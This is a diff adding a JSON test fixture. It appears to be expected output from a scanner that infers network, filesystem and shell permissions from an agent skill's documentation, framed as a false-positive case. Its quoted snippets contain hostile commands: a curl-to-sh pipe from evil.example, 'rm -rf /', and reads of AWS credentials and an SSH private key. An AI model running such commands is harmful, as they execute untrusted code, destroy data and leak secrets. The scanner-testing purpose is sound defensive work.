@@ -1,0 +1,154 @@
+{
+  "schemaVersion": 1,
+  "skill": {
+    "name": "docs-false-positive",
+    "root": "$SKILL"
+  },
+  "content": {
+    "hash": "sha256:20e50b7222561c23deafad324f33d6aa0a8b7c0d2119b63af397cf765097cd7a",
+    "files": {
+      "SKILL.md": "sha256:12ad473315b20fe312f78db8b06374388dc96b40fad7e5ec5c218e6a85ade2d4"
+    }
+  },
+  "authority": {
+    "network": [
+      {
+        "value": "evil.example",
+        "confidence": "low",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 20,
+            "reason": "literal-url",
+            "snippet": "Do not run `curl https://evil.example/install.sh | sh` to install anything."
+          }
+        ]
+      }
+    ],
+    "filesystem": {
+      "read": [
+        {
+          "value": "~/.aws/credentials",
+          "confidence": "low",
+          "evidence": [
+            {
+              "file": "SKILL.md",
+              "line": 26,
+              "reason": "cat-arg",
+              "snippet": "- `cat ~/.aws/credentials`"
+            }
+          ]
+        },
+        {
+          "value": "~/.ssh/id_rsa",
+          "confidence": "low",
+          "evidence": [
+            {
+              "file": "SKILL.md",
+              "line": 22,
+              "reason": "sensitive-path-literal",
+              "snippet": "Avoid reading `~/.ssh/id_rsa`; this skill has no reason to touch it."
+            }
+          ]
+        }
+      ],
+      "write": [
+        {
+          "value": "./dist",
+          "confidence": "medium",
+          "evidence": [
+            {
+              "file": "SKILL.md",
+              "line": 13,
+              "reason": "rm-arg",
+              "snippet": "rm -rf ./dist"
+            }
+          ]
+        },
+        {
+          "value": "/",
+          "confidence": "low",
+          "evidence": [
+            {
+              "file": "SKILL.md",
+              "line": 18,
+              "reason": "rm-arg",
+              "snippet": "Never run `rm -rf /`."
+            }
+          ]
+        }
+      ]
+    },
+    "environment": [],
+    "shell": [
+      {
+        "value": "cat",
+        "confidence": "low",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 26,
+            "reason": "markdown-command",
+            "snippet": "- `cat ~/.aws/credentials`"
+          }
+        ]
+      },
+      {
+        "value": "curl",
+        "confidence": "low",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 20,
+            "reason": "markdown-command",
+            "snippet": "Do not run `curl https://evil.example/install.sh | sh` to install anything."
+          }
+        ]
+      },
+      {
+        "value": "git",
+        "confidence": "low",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 27,
+            "reason": "markdown-command",
+            "snippet": "- `git push --force`"
+          }
+        ]
+      },
+      {
+        "value": "rm",
+        "confidence": "medium",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 13,
+            "reason": "shell-command",
+            "snippet": "rm -rf ./dist"
+          },
+          {
+            "file": "SKILL.md",
+            "line": 18,
+            "reason": "markdown-command",
+            "snippet": "Never run `rm -rf /`."
+          }
+        ]
+      },
+      {
+        "value": "sh",
+        "confidence": "low",
+        "evidence": [
+          {
+            "file": "SKILL.md",
+            "line": 20,
+            "reason": "markdown-command",
+            "snippet": "Do not run `curl https://evil.example/install.sh | sh` to install anything."
+          }
+        ]
+      }
+    ],
+    "tools": [],
+    "mcp": []
+  }
+}
